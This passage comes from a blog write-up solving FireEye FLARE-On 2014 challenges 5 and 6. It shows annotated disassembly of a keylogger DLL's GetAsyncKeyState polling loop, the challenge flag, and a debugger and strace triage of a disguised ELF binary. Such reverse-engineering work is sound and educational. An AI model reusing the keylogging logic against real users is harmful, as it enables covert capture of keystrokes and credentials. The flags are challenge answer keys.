<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4D3</span> <span class="nv">call</span>    <span class="nv">_rand</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4D8</span> <span class="nv">cdq</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4D9</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0C8h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4DE</span> <span class="nv">idiv</span>    <span class="nb">ecx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4E0</span> <span class="nv">add</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">32h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4E3</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_10</span><span class="p">],</span> <span class="nb">edx</span>    <span class="c1">; var_10 = size of array of type size_t</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4E6</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_10</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4E9</span> <span class="nv">imul</span>    <span class="nb">edx</span><span class="p">,</span> <span class="mh">0Fh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4EC</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; size_t</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4ED</span> <span class="nv">call</span>    <span class="nv">_malloc</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4F2</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4F5</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_C</span><span class="p">],</span> <span class="nb">eax</span> <span class="c1">; pointer to allocated memory</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4F8</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_10</span><span class="p">]</span>    <span class="c1">; eax = size of array</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4FB</span> <span class="nv">imul</span>    <span class="nb">eax</span><span class="p">,</span> <span class="mh">0Fh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4FE</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; size_t</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A4FF</span> <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; int</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A501</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_C</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A504</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; void *</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A505</span> <span class="nv">call</span>    <span class="nv">_memset</span>         <span class="c1">; Initialize array with 0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A50A</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A50D</span> <span class="nv">push</span>    <span class="mh">0Ah</span>             <span class="c1">; dwMilliseconds</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A50F</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">Sleep</span>        <span class="c1">; Sleep for 10 miliseconds</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A515</span> <span class="nv">xor</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; edx = 0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A517</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_8</span><span class="p">],</span> <span class="nb">dx</span> <span class="c1">; var_8 = 0</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A51B</span> <span class="nv">loc_1000A51B</span><span class="p">:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A51B</span> <span class="nv">movsx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_8</span><span class="p">]</span>   <span class="c1">; eax = 0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A51F</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_10</span><span class="p">]</span>  <span class="c1">; if (0 =&gt; size of array) </span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A522</span> <span class="nv">jge</span>     <span class="nv">short</span> <span class="nv">loc_1000A554</span> <span class="c1">; if (no memory was allocated) - jump to loc_1000A554</span>
</span><span class="line">
</span><span class="line"><span class="c1">; if memory was allocated</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A524</span> <span class="nv">push</span>    <span class="mh">0Ah</span>             <span class="c1">; dwMilliseconds</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A526</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">Sleep</span>        <span class="c1">; Sleep for 10 miliseconds</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A52C</span> <span class="nv">call</span>    <span class="nv">sub_10009EB0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A531</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_14</span><span class="p">],</span> <span class="nb">eax</span>    <span class="c1">; var_14 = sub_10009EB0()</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A534</span> <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_14</span><span class="p">],</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A538</span> <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc_1000A55</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Line 1 calls <code>rand</code> and the result is modified a few times by doing some calculations in lines 3-8. In line 9, it is pushed to stack as argument for <code>malloc</code>. So a random number of bytes are allocated. Seems like it is allocating an array of type <code>size_t</code>. This is reinforced because the number is multiplied by 16 (size of size_t) in line 8 before being pushed to the stack. After the <code>malloc</code>, the pointer to the allocated memory is stored in <code>var_C</code>. In lines 13-19 we see that this array is reset to zero by <code>memset</code>. Line 22 calls sleep with 10 miliseconds. Last line compares the calculated size of array with 0 and if so then no memory was allocated and program jumps back to the start of the function and tries to allocate memory and initialize memory again. If memory was allocated we continue to line 32 sleep for 10 miliseconds and call <code>sub_10009EB0</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>sub_10009EB0 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span> <span class="nv">sub_10009EB0</span> <span class="nv">proc</span> <span class="nv">near</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span> <span class="nv">var_8</span><span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">8</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span> <span class="nv">var_4</span><span class="err">=</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB0</span> <span class="nv">push</span>    <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB1</span> <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB3</span> <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">8</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EB6</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">8</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EBB</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">],</span> <span class="nb">ax</span>   <span class="c1">; var_4 = 0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EBF</span> <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">loc_10009ECD</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">ECD</span> <span class="nv">loc_10009ECD</span><span class="p">:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">ECD</span> <span class="nv">movsx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">ED1</span> <span class="nv">cmp</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">0DEh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">ED7</span> <span class="nv">jg</span>      <span class="nv">loc_1000A3A4</span> <span class="c1">; if var_4 &gt; 222 (0xDE) jump to loc_1000A3A4</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EDD</span> <span class="nv">movsx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EE1</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; vKey</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EE2</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetAsyncKeyState</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EE8</span> <span class="nv">movsx</span>   <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EEB</span> <span class="nv">cmp</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0FFFF8001h</span> <span class="c1">; check if vKey was pressed</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EF1</span> <span class="nv">jnz</span>     <span class="nv">loc_1000A39F</span>    <span class="c1">; jumptable 1000A2D4 default case</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A39F</span> <span class="nv">loc_1000A39F</span><span class="p">:</span>           <span class="c1">; jumptable 1000A2D4 default case</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A39F</span> <span class="nv">jmp</span>     <span class="nv">loc_10009EC1</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EC1</span> <span class="nv">loc_10009EC1</span><span class="p">:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EC1</span> <span class="nv">mov</span>     <span class="nb">cx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EC5</span> <span class="nv">add</span>     <span class="nb">cx</span><span class="p">,</span> <span class="mi">1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">10009</span><span class="nf">EC9</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">],</span> <span class="nb">cx</span> <span class="c1">; (var_4)++</span>
</span><span class="line"><span class="c1">; go back to line 14</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>This is what we are looking for. First <code>var_4</code> is set to 0 in line 10, then it is compared with 222 in lines 15-16 . If it is larger, we jump to <code>loc_1000A3A4</code>.</p>

<p>If not we will reach line 18 where <code>var_4</code> (initially 0) is stored in eax and pushed to stack as parameter for <code>GetAsyncKeyState</code>. We already know what this function does. If <code>vKey</code> has been pressed since last call to <code>GetAsyncKeyState</code>, it will return a value. Otherwise it will return 0. This <a href="http://reversing.be/forum/viewtopic.php?t=628&amp;sid=bf0d5e83ef43f1c34c41cd5cd2793a76">forum thread from 2007</a> discusses this usecase.<br />
If the key was not pressed, we jump to line 26 and then 29 where <code>var_4</code> is increased by 1. Then we go back to line 14 where <code>var_4</code> is compared with 222 and the cycle is repeated.</p>

<p>Now we know that the application loops through ascii characters from 0 to 222 checking to see if a key was pressed. If so we will not jump at line 23 and continue. Let’s take a look at that.</p>

<p><img src="http://parsiya.net/images/2014/flare/5-5.jpg" alt="Key pressed" title="Key pressed" /></p>

<p>This code is a series of cases for a switch statement (as IDA has detected). It checks what key was pressed performs specific actions for each key (taking the red arrows). It checks from <code>0x27</code> to <code>0x60</code>. By looking at an ASCII table, we can see that the application checks for some special characters, number and letters. I am not going to describe what each one does but I went through each function and looked at the code. Most of them were the same and looked uninteresting but the function for <code>M</code> or <code>0x4D</code> caught my eye. Finding the code for <code>M</code> and clicking on the red arrow besides it.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>If M is pressed </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A1B6</span> <span class="nv">loc_1000A1B6</span><span class="p">:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A1B6</span> <span class="nv">movsx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A1BA</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">4Dh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A1BD</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_1000A1C9</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A1BF</span> <span class="nv">call</span>    <span class="nv">sub_10009AF0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>What is <code>sub_10009AF0</code>?</p>

<p><img src="http://parsiya.net/images/2014/flare/5-6.jpg" alt="sub10009Af0" title="sub10009AF0" /></p>

<p>Nice, IDA has even tagged it as M for us. First we see that a <code>dword_10017000</code> is compared to 0. and if it is larger than 0, two functions are called: <code>__cfltcvt_init</code> and <code>sub_10001240</code>. Then returns with value <code>m</code>.</p>

<p><img src="http://parsiya.net/images/2014/flare/5-7.jpg" alt="__cfltcvt_init" title="__cfltcvt_init" /></p>

<p><code>__cfltcvt_init</code> sets one variable to 1 and resets the rest (including <code>dword_10017000</code>).</p>

<p><code>sub_10001240</code> creates a large array, initializes it with some values and then calles <code>GetWindowLong</code> and <code>DialogBoxIndirectParam</code>. I put a breakpoint in the end. Change the IP to the start of this function and ran the program.</p>

<p><img src="http://parsiya.net/images/2014/flare/5-8.jpg" alt="ASCII Flare" title="ASCII Flare" /></p>

<p>Nice! So to get this ASCII art we have to press M and <code>dword_10017000</code> needs to be 0. Let’s get back to <code>sub_10009AF0</code> and investigate <code>dword_10017000</code>.</p>

<p>Highlight <code>dword_10017000</code> and press <code>x</code> in IDA to see where this variable is being set to 1 (which will make the if true). There is only one place.</p>

<p><img src="http://parsiya.net/images/2014/flare/5-9.jpg" alt="Where M is set" title="Where M is set" /></p>

<p>Notice the <code>o</code>? Now see that variable <code>dword_100194F8</code> needs to be 1 to reach this line (top right). Follow that using <code>x</code>.</p>

<p>So we have <code>m</code> and then <code>o</code>. If we follow the chain and then reverse it, we have the flag. The binary is a keylogger, it saves all keystrokes to <code>svchost.log</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 5 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">l0gging.Ur.5tr0ke5@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>

<hr />

<h2 id="a-namech6a-challenge-6---ida-appreciation-day"><a name="ch6"></a> Challenge 6 - IDA Appreciation Day</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">Great success!
</span><span class="line">We've got another evil one for you, see if you can figure this out. This one will be rougher. Good luck!
</span><span class="line">-FLARE</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>While I was writing this solution, I saw this alternative way of solving the challenge. Great read: <a href="http://gaasedelen.blogspot.com/2014/09/solving-fireeyes-flare-on-six-via-side.html">Solving FireEye’s Flare On Six via Side Channels</a>.</p>

<p>New binary. Named <code>e7bc5d2c0cf4480348f5504196561297</code>. Let’s google it and <a href="http://pedump.me/e7bc5d2c0cf4480348f5504196561297/">first result</a> is interesting. Filename has the <code>exe</code> extension but it is a 64-bit ELF executable. Opening the file in <code>HxD</code> shows us the ELF magic bytes.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Info from pedumpme </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line">filename  spyEye1.4.exe
</span><span class="line">size      1221064 <span class="o">(</span>0x12a1c8<span class="o">)</span>
</span><span class="line">md5       e7bc5d2c0cf4480348f5504196561297
</span><span class="line"><span class="nb">type      </span>ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for </span>GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>I started a Kali 64-bit VM in VirtualBox. Less mess with it a bit. I used IDA Remote Linux Debugger. IDA was running on my host OS and the binary was in the Kali 64-bit VM. </p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Running commands </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="c"># the same as the website</span>
</span><span class="line"><span class="nv">$ </span>file e7bc5d2c0cf4480348f5504196561297
</span><span class="line">e7bc5d2c0cf4480348f5504196561297: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for </span>GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>strings e7bc5d2c0cf4480348f5504196561297
</span><span class="line"><span class="c"># results in a bunch of random strings</span>
</span><span class="line"><span class="c"># looks like a mix of error messages, source code and random words</span>
</span><span class="line">/index.html
</span><span class="line">Nosebleed   <span class="c"># Heartbleed eh? :)</span>
</span><span class="line">../nptl/sysdeps/unix/sysv/linux/x86_64/../fork.c
</span><span class="line">info<span class="o">[</span>20<span class="o">]</span>-&gt;d_un.d_val <span class="o">==</span> 7
</span><span class="line">...
</span><span class="line">
</span><span class="line"><span class="c"># let&#39;s see shared library calls - nope</span>
</span><span class="line"><span class="nv">$ </span>ltrace ./e7bc5d2c0cf4480348f5504196561297
</span><span class="line">ltrace: Couldn<span class="s1">&#39;t find .dynsym or .dynstr in &quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>
</span><span class="line">
</span><span class="line"><span class="s1"># Let&#39;</span>s run the binary manually
</span><span class="line"><span class="c"># running it normally</span>
</span><span class="line"><span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297
</span><span class="line">no
</span><span class="line">
</span><span class="line"><span class="c"># one argument - different message</span>
</span><span class="line"><span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg1
</span><span class="line">na
</span><span class="line">
</span><span class="line"><span class="c"># longer argument - message did not change</span>
</span><span class="line"><span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg11111
</span><span class="line">na
</span><span class="line">
</span><span class="line"><span class="c"># two arguments - message changed</span>
</span><span class="line"><span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2
</span><span class="line">bad
</span><span class="line">
</span><span class="line"><span class="c"># three arguments - message changed - shoule we stop?</span>
</span><span class="line"><span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3
</span><span class="line">stahp
</span><span class="line">
</span><span class="line"><span class="c"># four arguments - message is the same - we should stop </span>
</span><span class="line"><span class="nv">$ </span>./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3 arg4
</span><span class="line">stahp
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>I did not try executing the binary with different number of arguments at the start. I tried different argument lengths, really long arguments (e.g. ‘A’*40000). In the end I decided that two arguments was the correct way to run the binary. While debugging I realized that the binary crashes with a segfault message. While it is fine without the debugging. So some anti-debugging protections must be at work. We ran <code>ltrace</code> and didn’t see any shared library calls. Let’s run <code>strace</code> to get system calls.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>strace output </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>strace ./e7bc5d2c0cf4480348f5504196561297
</span><span class="line">execve<span class="o">(</span><span class="s2">&quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>, <span class="o">[</span><span class="s2">&quot;./e7bc5d2c0cf4480348f55041965612&quot;</span>...<span class="o">]</span>, <span class="o">[</span>/* 31 vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class="line">uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span><span class="s2">&quot;Linux&quot;</span>, <span class="nv">node</span><span class="o">=</span><span class="s2">&quot;kali&quot;</span>, ...<span class="o">})</span>  <span class="o">=</span> 0
</span><span class="line">brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x13e5000
</span><span class="line">brk<span class="o">(</span>0x13e61c0<span class="o">)</span>                          <span class="o">=</span> 0x13e61c0
</span><span class="line">arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x13e5880<span class="o">)</span>      <span class="o">=</span> 0
</span><span class="line">brk<span class="o">(</span>0x14071c0<span class="o">)</span>                          <span class="o">=</span> 0x14071c0
</span><span class="line">brk<span class="o">(</span>0x1408000<span class="o">)</span>                          <span class="o">=</span> 0x1408000
</span><span class="line">fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class="line">mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7f20ba6fb000
</span><span class="line">write<span class="o">(</span>1, <span class="s2">&quot;no\n&quot;</span>, 3no
</span><span class="line"><span class="o">)</span>                     <span class="o">=</span> 3
</span><span class="line">exit_group<span class="o">(</span>52<span class="o">)</span>                          <span class="o">=</span> ?
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>strace ./e7bc5d2c0cf4480348f5504196561297 arg1
</span><span class="line">execve<span class="o">(</span><span class="s2">&quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>, <span class="o">[</span><span class="s2">&quot;./e7bc5d2c0cf4480348f55041965612&quot;</span>..., <span class="s2">&quot;arg1&quot;</span><span class="o">]</span>, <span class="o">[</span>/* 31 vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class="line">uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span><span class="s2">&quot;Linux&quot;</span>, <span class="nv">node</span><span class="o">=</span><span class="s2">&quot;kali&quot;</span>, ...<span class="o">})</span>  <span class="o">=</span> 0
</span><span class="line">brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x18cb000
</span><span class="line">brk<span class="o">(</span>0x18cc1c0<span class="o">)</span>                          <span class="o">=</span> 0x18cc1c0
